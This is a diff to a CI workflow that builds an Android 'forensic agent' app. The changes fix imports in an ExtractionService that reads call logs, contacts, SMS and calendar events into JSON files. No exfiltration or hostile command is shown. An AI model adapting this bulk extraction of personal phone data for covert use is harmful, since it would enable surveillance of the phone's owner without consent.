@@ -44,7 +44,7 @@ jobs:
             "build-tools;33.0.2" \
             "platform-tools"
 
-      # --- PROJECT + FIXED DEPENDENCIES ---
+      # --- PROJECT + FIXED DEPENDENCIES + IMPORTS ---
       - name: Setup Project
         run: |
           # gradle.properties
@@ -54,7 +54,7 @@ jobs:
           org.gradle.jvmargs=-Xmx4g -Dfile.encoding=UTF-8
           EOF
 
-          # app/build.gradle — FIXED KOTLIN CONFLICT
+          # app/build.gradle — FIXED KOTLIN + NO CORE
           mkdir -p app
           cat > app/build.gradle << 'EOF'
           plugins {
@@ -83,14 +83,9 @@ jobs:
           dependencies {
               implementation 'androidx.appcompat:appcompat:1.6.1'
               implementation 'com.google.android.material:material:1.9.0'
-              
-              // FIXED: Force Kotlin 1.8.10
               implementation 'org.jetbrains.kotlin:kotlin-stdlib:1.8.10'
-              
-              // Remove androidx.core:core (caused conflict)
           }
 
-          // Force Kotlin version
           configurations.all {
               resolutionStrategy {
                   force 'org.jetbrains.kotlin:kotlin-stdlib:1.8.10'
@@ -232,7 +227,7 @@ jobs:
           }
           EOF
 
-          # ExtractionService.java (unchanged)
+          # ExtractionService.java — FIXED IMPORTS
           cat > app/src/main/java/com/forensic/agent/ExtractionService.java << 'EOF'
           package com.forensic.agent;
 
@@ -245,10 +240,12 @@ jobs:
           import android.database.Cursor;
           import android.net.Uri;
           import android.os.Build;
+          import android.os.Environment;
           import android.os.IBinder;
           import android.provider.CallLog;
           import android.provider.ContactsContract;
           import android.provider.Telephony;
+          import android.provider.CalendarContract;
           import androidx.core.app.NotificationCompat;
           import org.json.JSONArray;
           import org.json.JSONObject;
@@ -386,7 +383,7 @@ jobs:
               private void extractCalendar(File file) throws Exception {
                   JSONArray events = new JSONArray();
                   Cursor c = getContentResolver().query(
-                      android.provider.CalendarContract.Events.CONTENT_URI,
+                      CalendarContract.Events.CONTENT_URI,
                       new String[]{
                           CalendarContract.Events._ID,
                           CalendarContract.Events.TITLE,
